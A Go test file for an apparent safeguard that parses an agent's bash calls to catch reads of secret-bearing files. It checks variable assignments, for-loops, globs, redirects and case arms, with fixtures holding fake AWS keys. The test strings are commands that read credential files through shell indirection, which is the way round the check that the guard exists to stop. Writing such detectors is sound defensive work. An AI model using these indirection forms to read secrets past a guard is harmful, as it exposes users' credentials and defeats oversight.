func TestAnOperandFromALiteralAssignmentIsResolved(t *testing.T) {
	dir, name := planted(t)
	for _, command := range []string{
		"SP=" + dir + "; cat $SP/" + name,
		"SP=" + dir + "; cat \"$SP/" + name + "\"",
		"SP=" + dir + "; cat ${SP}/" + name,
		"export SP=" + dir + "; cat $SP/" + name,
		"SP=" + dir + "\ncat $SP/" + name,
		"A=" + dir + "; SP=$A; cat $SP/" + name,
		// The shape Q136 measured: a scratchpad path written down once, a
		// redirect through it, and a reader of the result.
		"SP=" + dir + "; python3 -c pass > \"$SP/unit.log\" 2>&1; rc=$?; tail -30 \"$SP/" + name + "\"",
		// The cd tracker sees the substituted target.
		"D=" + dir + "; cd $D && cat " + name,
		// An input redirect is an operand now (#121), and it is substituted too.
		"SP=" + dir + "; cat < $SP/" + name,
		// Reached through &&, after segments certain to have run: an
		// assignment, and a cd the tracker followed. The shape the week's
		// 220 `cd "$(git rev-parse --show-toplevel)" && SP=…` calls take.
		"X=1 && SP=" + dir + "; cat $SP/" + name,
		"cd " + dir + " && SP=" + dir + "; cat $SP/" + name,
		// And within its own list after a command: the cat runs only if the
		// assignment did.
		"true && SP=" + dir + " && cat $SP/" + name,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, t.TempDir()))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
				t.Errorf("reason = %q, want the file the variable names", reason)
			}
		})
	}
}

// What stays unresolved, each because bash would not have used the literal
// the string shows: a value the string does not settle, an assignment that
// cannot persist, a name a builtin may have rewritten, a prefix assignment on
// the reading command itself, and a variable the string never assigns. The
// port poisons rather than guesses, so all of these are the record they were
// before it.
func TestAnAssignmentThePortCannotTrustLeavesTheOperandUnresolved(t *testing.T) {
	dir, name := planted(t)
	for _, tc := range []struct{ name, command string }{
		{"never assigned", "cat $SP/" + name},
		{"a substitution value", "SP=$(mktemp -d); cat $SP/" + name},
		{"a variable value", "SP=$HOME/x; cat $SP/" + name},
		{"a value with a space", "SP='" + dir + " x'; cat $SP/" + name},
		{"a glob value", "SP=" + dir + "*; cat $SP/" + name},
		{"assigned in a subshell", "(SP=" + dir + "); cat $SP/" + name},
		{"assigned in a pipeline stage", "SP=" + dir + " | cat $SP/" + name},
		{"assigned in the background", "SP=" + dir + " & cat $SP/" + name},
		{"a prefix on the reader", "SP=" + dir + " cat $SP/" + name},
		{"reached through && after a command, in the next statement", "true && SP=" + dir + "; cat $SP/" + name},
		{"reached through ||", "false || SP=" + dir + "; cat $SP/" + name},
		{"tentative, then a ||", "false && SP=" + dir + " || cat $SP/" + name},
		{"rewritten by read", "SP=" + dir + "; read -r SP; cat $SP/" + name},
		{"rewritten by eval", "SP=" + dir + "; eval x=1; cat $SP/" + name},
		{"reassigned to a substitution", "SP=" + dir + "; SP=$(pwd); cat $SP/" + name},
		{"appended to", "SP=" + dir + "; SP+=/x; cat $SP/" + name},
		{"after an IFS change", "SP=" + dir + "; IFS=/; cat $SP/" + name},
		{"an expansion operator", "SP=" + dir + "; cat ${SP%/}/" + name},
		{"in a queued body", "SP=" + dir + "; echo `cat $SP/" + name + "`"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, t.TempDir()))
			if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "expands at run time") {
				t.Errorf("coverage reason = %q, want the operand unresolved", reason)
			}
		})
	}
}

// The same boundary arriving in the resolver, which is where Q92's divergence
// reached after the literal-assignment resolver landed. bash reads `'SP=…'` as a
// command name and assigns nothing, so `$SP/f` is an operand this cannot settle
// -- a coverage failure, which defers with a record (#117) rather than resolving
// to a file bash would open only if SP already held that path.
//
// The unquoted control is what says the resolver still works: the same string
// without the quotes resolves and denies, so the deferral above is the quoting
// and not the resolver having stopped reading assignments.
func TestAQuotedAssignmentDoesNotResolve(t *testing.T) {
	dir, name := planted(t)
	for _, command := range []string{
		"'SP=" + dir + "'; cat $SP/" + name,
		"\"SP=" + dir + "\"; cat $SP/" + name,
		"SP\\=" + dir + "; cat $SP/" + name,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, t.TempDir()))
			if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "expands at run time") {
				t.Errorf("coverage reason = %q, want the operand unresolved", reason)
			}
		})
	}
	t.Run("the unquoted control still resolves", func(t *testing.T) {
		command := "SP=" + dir + "; cat $SP/" + name
		code, stdout, stderr := drive(t, bashCall(t, command, t.TempDir()))
		if code != 0 {
			t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
		}
		if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
			t.Errorf("reason = %q, want the resolved file named", reason)
		}
	})
}

// loopFixture is the tree the `for` tests iterate: a planted file, a clean one
// beside it, a `.bak` beside that, and the same pair one level down. Which file
// a reason names is what says which candidate was opened.
func loopFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for rel, body := range map[string]string{
		"clean.env":      "PORT=8080\n",
		"deploy.env":     "AWS_ACCESS_KEY_ID=" + secret + "\n",
		"deploy.env.bak": "AWS_ACCESS_KEY_ID=" + secret + "\n",
		"d1/c.env":       "PORT=8080\n",
		"d2/c.env":       "AWS_ACCESS_KEY_ID=" + secret + "\n",
	} {
		path := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// A `$f` bound to a `for f in <list>` is one path per value bash iterates, and
// the loop body reads all of them, so all of them are scanned (Q149). Each row
// plants the key in exactly one candidate, so a reason naming that file is the
// port having opened it rather than having stopped at the first.
//
// The list is bash's, driven 2026-09-07 on 5.3.15 over the same tree: each of
// these read the file the row expects, and the glob rows skipped a `.hidden.env`
// beside them, which is the default globFiles already models.
func TestALoopVariableResolvesToTheFilesBashIterates(t *testing.T) {
	dir := loopFixture(t)
	for _, tc := range []struct{ name, command, wants string }{
		{"the first item", `for f in deploy.env clean.env; do cat "$f"; done`, "deploy.env"},
		{"a later item", `for f in clean.env deploy.env; do cat "$f"; done`, "deploy.env"},
		{"a glob item", `for f in *.env; do cat "$f"; done`, "deploy.env"},
		// The candidate is the pattern, and what makes that sound here is that
		// it goes on to expand: `*.env` + `.bak` matches every file bash reads.
		{"a glob item under a suffix", `for f in *.env; do cat "$f".bak; done`, "deploy.env.bak"},
		{"a literal item under a suffix", `for f in deploy; do cat "$f".env; done`, "deploy.env"},
		{"an item from a literal assignment", `SP=d2; for f in "$SP"/c.env; do cat "$f"; done`, "d2/c.env"},
		{"a nested loop over the outer variable", `for d in d1 d2; do for f in "$d"/c.env; do cat "$f"; done; done`, "d2/c.env"},
		{"a loop in a pipeline", `for f in deploy.env; do cat "$f"; done | head -1`, "deploy.env"},
		// bash leaves f at the last item, so the port's candidate set is a
		// superset here -- it scans clean.env too. Both are files the same call
		// already read inside the loop, which is what bounds the superset.
		{"a use after the loop", `for f in clean.env deploy.env; do :; done; cat "$f"`, "deploy.env"},
		{"an input redirect", `for f in clean.env deploy.env; do cat < "$f"; done`, "deploy.env"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, dir))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			reason := reasonOf(t, stdout)
			if !strings.Contains(reason, filepath.FromSlash(tc.wants)) {
				t.Errorf("reason = %q, want the candidate %q opened", reason, tc.wants)
			}
		})
	}
}

// The lists the port declines, each because bash would iterate something this
// cannot compute, or because the header sits where the segments reading it are
// not. Every one poisons the name, which is the coverage record the operand had
// before loop binding existed -- so nothing here is a new refusal.
//
// The last four are the divergence from upstream, which binds regardless: there
// a candidate bash never took only adds a prompt, here it decides which file
// gets opened. andOr.binds carries the argument.
func TestALoopListThePortCannotExpandRecordsTheOperand(t *testing.T) {
	dir := loopFixture(t)
	for _, tc := range []struct{ name, command string }{
		{"a brace item", `for f in {clean,deploy}.env; do cat "$f"; done`},
		{"an unset variable", `for f in $X; do cat "$f"; done`},
		{"an environment variable", `for f in $HOME/deploy.env; do cat "$f"; done`},
		{"a substitution item", "for f in `echo deploy.env`; do cat \"$f\"; done"},
		{"no list at all", `for f; do cat "$f"; done`},
		{"an empty list", `for f in; do cat "$f"; done`},
		{"the arithmetic form", `for ((i=0;i<1;i++)); do cat "$f"; done`},
		{"rewritten by read", `for f in deploy.env; do :; done; read -r f; cat "$f"`},
		{"rewritten by eval", `for f in deploy.env; do :; done; eval x=1; cat "$f"`},
		{"reassigned as a scalar to a substitution", `for f in deploy.env; do :; done; f=$(pwd); cat "$f"`},
		{"a header in a subshell", `(for f in deploy.env; do cat "$f"; done)`},
		{"a header in a pipeline stage", `echo x | for f in deploy.env; do cat "$f"; done`},
		{"a header reached through ||", `false || for f in deploy.env; do cat "$f"; done`},
		{"a header reached through && after a command", `mkdir -p x && for f in deploy.env; do cat "$f"; done`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, dir))
			if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "expands at run time") {
				t.Errorf("coverage reason = %q, want the operand unresolved", reason)
			}
		})
	}
}

// Over the cap the name poisons and the token records; neither enumerates
// anything. The two limbs are separate because they fail at different places --
// the list as it is built, the token before a single candidate is materialised
// -- and the second is the one that would otherwise be 289 paths to stat for a
// reader that reads two files.
//
// The list's length is derived from the cap, so raising the constant is not a
// mutation that can break this: the fixture grows with it and stays one item
// past. What breaks it is deleting the guard, which is how it was driven.
func TestALoopOverTheCandidateCapIsNotEnumerated(t *testing.T) {
	dir := loopFixture(t)
	var many []string
	for i := 0; i <= maxLoopCandidates; i++ {
		many = append(many, fmt.Sprintf("f%d.env", i))
	}
	t.Run("a list over the cap", func(t *testing.T) {
		command := "for f in " + strings.Join(many, " ") + `; do cat "$f"; done`
		code, stdout, stderr := drive(t, bashCall(t, command, dir))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "expands at run time") {
			t.Errorf("coverage reason = %q, want the operand unresolved", reason)
		}
	})
	t.Run("a token whose cross product is over the cap", func(t *testing.T) {
		var items []string
		for i := 0; i < 17; i++ { // 17*17 = 289
			items = append(items, fmt.Sprintf("d%d", i))
		}
		list := strings.Join(items, " ")
		command := "for a in " + list + "; do for b in " + list + `; do cat "$a/$b"; done; done`
		code, stdout, stderr := drive(t, bashCall(t, command, dir))
		reason := deferred(t, code, stdout, stderr)
		if !strings.Contains(reason, "more than 256") {
			t.Errorf("coverage reason = %q, want the cap named", reason)
		}
	})
}

// A `case` arm runs only if a pattern matched, and nothing here evaluates a
// pattern (Q151). So what an arm assigns and where it moves are both dropped:
// the operand that used to resolve against them is a coverage record instead.
//
// bash 5.3.15, driven 2026-09-07 over the same tree: `x` matches no pattern in
// any of these, so the assignment never happened, the `cd` never happened, and
// the reader after the `esac` read the environment's path or the payload's own
// directory. Before this the port read the arm's path -- `case x in y)
// P=/case;; esac; cat $P/f` opened `/case/f`.
func TestACaseArmDoesNotSettleWhatComesAfterIt(t *testing.T) {
	dir, name := planted(t)
	for _, tc := range []struct{ name, command string }{
		{"an assignment in an arm", "case x in y) SP=" + dir + ";; esac; cat $SP/" + name},
		{"in a later arm", "case x in y) :;; z) SP=" + dir + ";; esac; cat $SP/" + name},
		{"under bash's optional pattern opener", "case x in (y) SP=" + dir + ";; esac; cat $SP/" + name},
		{"in an alternation's arm", "case x in y|z) SP=" + dir + ";; esac; cat $SP/" + name},
		{"in a nested arm", "case x in y) case q in r) SP=" + dir + ";; esac;; esac; cat $SP/" + name},
		{"reached through && inside an arm", "case x in y) true && SP=" + dir + ";; esac; cat $SP/" + name},
		{"an unterminated case", "case x in y) SP=" + dir + "; cat $SP/" + name},
		{"a cd in an arm", "case x in y) cd " + dir + ";; esac; cat " + name},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, t.TempDir()))
			if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "not settled here") &&
				!strings.Contains(reason, "expands at run time") {
				t.Errorf("coverage reason = %q, want the operand unresolved", reason)
			}
		})
	}
}

// The arm is what the port refuses, not the statement around it and not every
// `)` at paren depth 0. A process substitution reaches the segmenter as a
// redirect target that never incremented the depth, so its close is the shape
// anything keying on a bare `)` would read as a pattern end -- and everything
// after it would stop resolving. Each of these must still open the file.
func TestWhatIsNotACaseArmStillResolves(t *testing.T) {
	dir, name := planted(t)
	for _, tc := range []struct{ name, command string }{
		{"after a process substitution", "cat <(echo x) >/dev/null; SP=" + dir + "; cat $SP/" + name},
		{"after a subshell", "(cd /tmp); SP=" + dir + "; cat $SP/" + name},
		{"after a function definition", "f() { echo hi; }; SP=" + dir + "; cat $SP/" + name},
		{"after a substitution", "echo $(echo x); SP=" + dir + "; cat $SP/" + name},
		{"after the whole case", "case x in y) Q=1;; esac; SP=" + dir + "; cat $SP/" + name},
		{"before the case", "SP=" + dir + "; case x in y) Q=1;; esac; cat $SP/" + name},
		{"the word as an operand", "echo case; SP=" + dir + "; cat $SP/" + name},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, t.TempDir()))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
				t.Errorf("reason = %q, want the file the variable names", reason)
			}
		})
	}
}

// A `for` header inside an arm binds nothing, and it needs no case of its own
// in vars.go to do so: andOr.binds is `segment.Persists && l.settled`, and
// enter has already unsettled the list for the arm. Pinned because that is a
// property of two rules meeting rather than of either, so a change to enter
// could take it away without touching anything that names loops.
func TestALoopHeaderInsideACaseArmBindsNothing(t *testing.T) {
	dir := loopFixture(t)
	command := `case x in y) for f in deploy.env; do :; done;; esac; cat "$f"`
	code, stdout, stderr := drive(t, bashCall(t, command, dir))
	if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "expands at run time") {
		t.Errorf("coverage reason = %q, want the operand unresolved", reason)
	}
}
